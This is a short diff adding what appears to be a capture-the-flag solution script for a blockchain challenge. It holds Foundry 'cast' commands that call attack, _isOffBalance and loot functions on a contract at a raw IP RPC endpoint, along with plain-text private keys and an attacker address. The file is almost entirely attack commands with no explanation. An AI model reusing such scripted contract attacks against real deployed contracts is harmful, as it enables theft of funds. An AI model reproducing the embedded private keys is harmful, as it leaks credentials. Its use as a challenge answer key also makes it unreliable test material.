@@ -1,0 +1,11 @@
+attack=0xce0774F42305C9c39581c2583d2A4EfC3e09Bd16
+priv=0x8e5e853ee081c8d0eeac6874002dbd5362b0f3b50d3bd524b5cb47dc0d55812c
+
+cast send 0x8C3c45FE9A8AaAC2F6a7f5c1EDC915f9A6BfaC73 "attack(uint256)", 1000 --rpc-url http://157.245.39.76:31569/rpc --private-key 0x3efbc3898d1b31db4c4aa845f1fc8396339694c305e20626f52309264d99cd34
+cast send 0x8C3c45FE9A8AaAC2F6a7f5c1EDC915f9A6BfaC73 "lifePoints()" --rpc-url http://157.245.39.76:31569/rpc --private-key 0x3efbc3898d1b31db4c4aa845f1fc8396339694c305e20626f52309264d99cd34
+
+cast send 0x8C3c45FE9A8AaAC2F6a7f5c1EDC915f9A6BfaC73 "_isOffBalance()" --rpc-url http://157.245.39.76:31569/rpc --private-key 0x3efbc3898d1b31db4c4aa845f1fc8396339694c305e20626f52309264d99cd34
+
+
+# AT THE END
+cast call 0x8C3c45FE9A8AaAC2F6a7f5c1EDC915f9A6BfaC73 "loot()" --rpc-url http://157.245.39.76:31569/rpc 
